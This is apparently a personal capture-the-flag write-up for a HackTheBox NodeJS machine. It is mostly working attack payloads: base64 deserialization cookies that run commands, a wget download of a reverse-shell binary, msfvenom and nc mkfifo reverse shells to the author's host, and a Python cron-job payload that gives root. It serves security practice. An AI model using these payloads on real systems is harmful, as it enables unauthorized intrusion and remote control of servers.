### Summary
It's an old box, almost 6 years. So despite it being labelled as a medium box, actually an easy one.


### Enum
1. rustscan port 3000 opening
2. Nmap or autorecon found its NodeJS
3. Go to the webpage, refresh get the hint of SSTI (I found out that I was wrong after hacked in, actually NodeJS Deserialization)
4. Hacktricks' one just working

https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#jade-nodejs

```txt
{"username":"admin","country":"Idk Probably Somewhere Dumb","city":"Lametown","num":"{root.process.mainModule.require('child_process').spawnSync('cat', ['/etc/passwd']).stdout}"}

#{root.process.mainModule.require('child_process').spawnSync('cat', ['/etc/passwd']).stdout}

eyJ1c2VybmFtZSI6ImFkbWluIiwiY291bnRyeSI6IklkayBQcm9iYWJseSBTb21ld2hlcmUgRHVtYiIsImNpdHkiOiJMYW1ldG93biIsIm51bSI6Intyb290LnByb2Nlc3MubWFpbk1vZHVsZS5yZXF1aXJlKCdjaGlsZF9wcm9jZXNzJykuc3Bhd25TeW5jKCdjYXQnLCBbJy9ldGMvcGFzc3dkJ10pLnN0ZG91dH0ifQ%3d%3d
```

### Foothold
```txt
{"username":"admin","country":"Idk Probably Somewhere Dumb","city":"Lametown","num":"{root.process.mainModule.require('child_process').spawnSync('ls', ['-a /home/']).stdout}"}

{"username":"admin","country":"Idk Probably Somewhere Dumb","city":"Lametown","num":"{root.process.mainModule.require('child_process').spawnSync('ls', ['-alh'], ['/home/sun']).stdout}"}

eyJ1c2VybmFtZSI6ImFkbWluIiwiY291bnRyeSI6IklkayBQcm9iYWJseSBTb21ld2hlcmUgRHVtYiIsImNpdHkiOiJMYW1ldG93biIsIm51bSI6Intyb290LnByb2Nlc3MubWFpbk1vZHVsZS5yZXF1aXJlKCdjaGlsZF9wcm9jZXNzJykuc3Bhd25TeW5jKCdscycsIFsnLWFsaCddLCBbJy9ob21lL3N1biddKS5zdGRvdXR9In0%3D
```
It doesn't have an ssh folder. So let's go normal reverse shell. e.g.

https://github.com/A1vinSmith/Cloud-Hacking/tree/main/HackTheBox/Epsilon#ssti-order

```txt cyberchef
{"username":"admin","country":"Idk Probably Somewhere Dumb","city":"Lametown","num":"{root.process.mainModule.require('child_process').spawnSync('wget', ['http://10.10.16.6/reverse.elf']).stdout}"}

eyJ1c2VybmFtZSI6ImFkbWluIiwiY291bnRyeSI6IklkayBQcm9iYWJseSBTb21ld2hlcmUgRHVtYiIsImNpdHkiOiJMYW1ldG93biIsIm51bSI6Intyb290LnByb2Nlc3MubWFpbk1vZHVsZS5yZXF1aXJlKCdjaGlsZF9wcm9jZXNzJykuc3Bhd25TeW5jKCd3Z2V0JywgWydodHRwOi8vMTAuMTAuMTYuNiddKS5zdGRvdXR9In0%3D

{"username":"admin","country":"Idk Probably Somewhere Dumb","city":"Lametown","num":"{root.process.mainModule.require('child_process').spawnSync('chmod', ['+x'], ['reverse.elf']).stdout}"}

{"username":"admin","country":"Idk Probably Somewhere Dumb","city":"Lametown","num":"{root.process.mainModule.require('child_process').spawnSync('ls', ['-lh']).stdout}"}
```

```
❯ msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.16.6 LPORT=3000 -f elf -o reverse.elf
...
❯ ls -lh
-rw-r--r-- 1 kali kali  194 Feb  9 16:23  reverse.elf
```

I was being silly. I should just use `require('child_process').exec('nc -e bash 10.10.16.6 3000')` from https://www.revshells.com/

working payload
```txt cyberchef
{"username":"admin","country":"Idk Probably Somewhere Dumb","city":"Lametown","num":"{root.process.mainModule.require('child_process').exec('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 10.10.16.6 3000 >/tmp/f').stdout}"}
```

It did pop up a shell. But I just run reverse.elf again to get another one since it's better.

### Enum for root
It's a serialised vuln rather than SSTI.

pspy waiting up to 5 minutes
```txt
2023/02/08 22:49:32 CMD: UID=0    PID=1      | /sbin/init splash 
2023/02/08 22:50:02 CMD: UID=0    PID=7726   | /usr/sbin/CRON -f 
2023/02/08 22:50:02 CMD: UID=0    PID=7728   | /bin/sh -c python /home/sun/Documents/script.py > /home/sun/output.txt; cp /root/script.py /home/sun/Documents/script.py; chown sun:sun /home/sun/Documents/script.py; chattr -i /home/sun/Documents/script.py; touch -d "$(date -R -r /home/sun/Documents/user.txt)" /home/sun/Documents/script.py                                                  
2023/02/08 22:50:02 CMD: UID=0    PID=7727   | /bin/sh -c python /home/sun/Documents/script.py > /home/sun/output.txt; cp /root/script.py /home/sun/Documents/script.py; chown sun:sun /home/sun/Documents/script.py; chattr -i /home/sun/Documents/script.py; touch -d "$(date -R -r /home/sun/Documents/user.txt)" /home/sun/Documents/script.py                                                  
2023/02/08 22:50:02 CMD: UID=0    PID=7729   | 
```
### Root
write into script.py
```py payload
import os
os.system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.16.6 443 >/tmp/f")
```